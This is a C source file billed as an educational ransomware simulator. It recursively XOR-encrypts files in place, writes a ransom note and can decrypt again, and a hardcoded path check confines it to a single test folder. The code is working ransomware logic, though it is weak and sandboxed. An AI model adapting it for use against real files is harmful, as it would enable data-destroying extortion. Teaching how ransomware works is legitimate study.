/*
 * ransomware_simulator.c
 *
 * Educational Ransomware Simulator — POSIX File System Cryptor
 *
 * PURPOSE:
 *   Demonstrates how ransomware interacts with the OS file system at
 *   the system-call level. Recursively traverses a target directory,
 *   encrypts every regular file in-place using a multi-byte XOR cipher,
 *   drops a ransom note, and supports full decryption with a single flag.
 *
 * USAGE:
 *   ./ransomware -e <target_dir>   encrypt all files
 *   ./ransomware -d <target_dir>   decrypt all files
 *
 * SYSTEM CALLS USED:
 *   opendir / readdir / closedir   directory traversal
 *   stat / S_ISREG / S_ISDIR       file type detection
 *   open / read / write / close    raw byte I/O
 *   unlink / rename                atomic file replacement
 *   realpath / snprintf / strncmp  safe path handling
 *
 * SECURITY NOTE:
 *   A hardcoded SAFE_ROOT boundary prevents the program from operating
 *   outside the designated test directory. Never run on real data.
 *
 * NOTE ON -e AND -d FLAGS:
 *   Because XOR is its own inverse (applying the same key twice restores
 *   the original data), -e and -d perform the exact same byte transformation.
 *   The only behavioural difference between the two flags is:
 *     -e  creates README_RANSOM.txt in the target directory root.
 *     -d  removes README_RANSOM.txt after processing all files.
 *   In all other respects the flags are fully interchangeable — running
 *   -e twice on the same directory is equivalent to running -e then -d.
 *   With a real cipher (e.g. AES) encryption and decryption would be
 *   distinct operations and the flags would not be interchangeable.
 *
 * AUTHOR: Giacomo Cristante
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

/* ------------------------------------------------------------------ */
/* Configuration                                                        */
/* ------------------------------------------------------------------ */

/* Absolute path the program is allowed to operate in.
 * Any path outside this prefix is immediately rejected. */
#define SAFE_ROOT "/Users/giacomocristante/Desktop/ProgRansomware/victim_test"

/* Name of the ransom note dropped in the target directory root.
 * This file is always skipped during encryption and decryption. */
#define RANSOM_NOTE "README_RANSOM.txt"

/* Multi-byte XOR key (16 bytes).
 * Each file byte at position N is XORed with key[N % KEY_LEN].
 * XOR is symmetric: applying the same key twice restores the original. */
#define KEY_LEN 16
static const unsigned char XOR_KEY[KEY_LEN] = {
    0xAB, 0x3F, 0x77, 0xC2,
    0x91, 0x5E, 0x08, 0xD4,
    0x2A, 0xF0, 0x63, 0xB8,
    0x14, 0x7D, 0xE5, 0x49
};

/* ------------------------------------------------------------------ */
/* Function prototypes                                                  */
/* ------------------------------------------------------------------ */

void traverse(const char *path, int mode);
void encrypt_file(const char *path, int mode);
void write_ransom_note(const char *dir_path);

/* ------------------------------------------------------------------ */
/* Path safety check                                                    */
/* ------------------------------------------------------------------ */

/*
 * is_safe_path — returns 1 if 'path' is equal to or inside SAFE_ROOT.
 *
 * Two conditions must both hold:
 *   1. The path must start with the SAFE_ROOT prefix (strncmp).
 *   2. The character immediately after the prefix must be '/' or '\0'
 *      to prevent false positives like "/victim_test_extended/...".
 */
int is_safe_path(const char *path) {
    size_t root_len = strlen(SAFE_ROOT);
    if (strncmp(path, SAFE_ROOT, root_len) != 0) return 0;
    if (path[root_len] != '/' && path[root_len] != '\0') return 0;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Entry point                                                          */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[]) {

    if (argc != 3) {
        fprintf(stderr, "Usage: %s [-e|-d] <target_dir>\n", argv[0]);
        return EXIT_FAILURE;
    }

    /* Parse mode flag: -e = encrypt (1), -d = decrypt (-1) */
    int mode = 0;
    if      (strcmp(argv[1], "-e") == 0) mode =  1;
    else if (strcmp(argv[1], "-d") == 0) mode = -1;
    else {
        fprintf(stderr, "Invalid flag: %s  (use -e or -d)\n", argv[1]);
        return EXIT_FAILURE;
    }

    /* Resolve relative paths, symlinks and ".." to an absolute path */
    char base_path[4096];
    if (realpath(argv[2], base_path) == NULL) {
        perror("realpath");
        return EXIT_FAILURE;
    }

    /* Enforce the safe root boundary before touching anything */
    if (!is_safe_path(base_path)) {
        fprintf(stderr, "[BLOCKED] '%s' is outside SAFE_ROOT.\n", base_path);
        fprintf(stderr, "This program only operates inside: %s\n", SAFE_ROOT);
        return EXIT_FAILURE;
    }

    if (mode == 1)
        write_ransom_note(base_path);

    traverse(base_path, mode);

    /* On decryption, remove the ransom note to restore the original state */
    if (mode == -1) {
        char note_path[4096];
        snprintf(note_path, sizeof(note_path), "%s/%s", base_path, RANSOM_NOTE);
        unlink(note_path);
    }

    return EXIT_SUCCESS;
}

/* ------------------------------------------------------------------ */
/* Recursive directory traversal                                        */
/* ------------------------------------------------------------------ */

/*
 * traverse — walks the directory tree rooted at 'path'.
 *
 * For each entry:
 *   - "." and ".." are skipped to prevent infinite recursion.
 *   - The ransom note is always skipped.
 *   - Regular files are passed to encrypt_file().
 *   - Subdirectories trigger a recursive call.
 *
 * 'mode' is forwarded to encrypt_file() only for labeling output.
 */
void traverse(const char *path, int mode) {

    DIR *dir = opendir(path);
    if (dir == NULL) { perror("opendir"); return; }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {

        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0) continue;

        if (strcmp(entry->d_name, RANSOM_NOTE) == 0) continue;

        char full_path[4096];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(full_path, &st) == -1) { perror("stat"); continue; }

        if (S_ISREG(st.st_mode)) {
            encrypt_file(full_path, mode);
        } else if (S_ISDIR(st.st_mode)) {
            printf("[DIR]  %s\n", full_path);
            traverse(full_path, mode);
        }
    }

    closedir(dir);
}

/* ------------------------------------------------------------------ */
/* Ransom note                                                          */
/* ------------------------------------------------------------------ */

/*
 * write_ransom_note — creates the ransom note in the target directory.
 * Called once before encryption begins. Uses raw open()/write() like
 * every other file operation in this program.
 */
void write_ransom_note(const char *dir_path) {

    char note_path[4096];
    snprintf(note_path, sizeof(note_path), "%s/%s", dir_path, RANSOM_NOTE);

    int fd = open(note_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd == -1) { perror("open ransom note"); return; }

    const char *msg =
        "YOUR FILES HAVE BEEN ENCRYPTED.\n\n"
        "Run './ransomware -d <dir>' with the original key to decrypt.\n";

    write(fd, msg, strlen(msg));
    close(fd);

    printf("[RANSOM] Note written to %s\n", note_path);
}

/* ------------------------------------------------------------------ */
/* XOR encryption / decryption (symmetric)                             */
/* ------------------------------------------------------------------ */

/*
 * encrypt_file — XOR-encrypts or decrypts a single file in-place.
 *
 * Algorithm:
 *   1. Open the source file for reading.
 *   2. Create a temporary file (.tmp) for the output.
 *   3. Read up to 1024 bytes at a time.
 *   4. XOR each byte with key[key_pos % KEY_LEN]; increment key_pos.
 *      key_pos persists across read() calls so the key stream is
 *      continuous throughout the entire file, not reset per block.
 *   5. Write the transformed bytes to the temp file.
 *   6. After both files are closed, unlink the original and rename
 *      the temp file to the original path (atomic replacement).
 *
 * Because XOR is its own inverse, the same function handles both
 * encryption and decryption. 'mode' only affects the log output.
 */
void encrypt_file(const char *path, int mode) {

    int fd_in = open(path, O_RDONLY);
    if (fd_in == -1) { perror("open input"); return; }

    char out_path[4096];
    snprintf(out_path, sizeof(out_path), "%s.tmp", path);

    int fd_out = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_out == -1) { perror("open output"); close(fd_in); return; }

    unsigned char buffer[1024];
    ssize_t bytes_read;
    size_t key_pos = 0;

    while ((bytes_read = read(fd_in, buffer, sizeof(buffer))) > 0) {
        for (ssize_t i = 0; i < bytes_read; i++)
            buffer[i] ^= XOR_KEY[key_pos++ % KEY_LEN];
        if (write(fd_out, buffer, bytes_read) == -1) { perror("write"); break; }
    }

    if (bytes_read == -1) perror("read");

    close(fd_in);
    close(fd_out);

    /* Replace original only after the output file is fully written */
    if (unlink(path)           == -1) { perror("unlink"); return; }
    if (rename(out_path, path) == -1) { perror("rename"); return; }

    printf("[%-9s] %s\n", mode == 1 ? "ENCRYPTED" : "DECRYPTED", path);
}
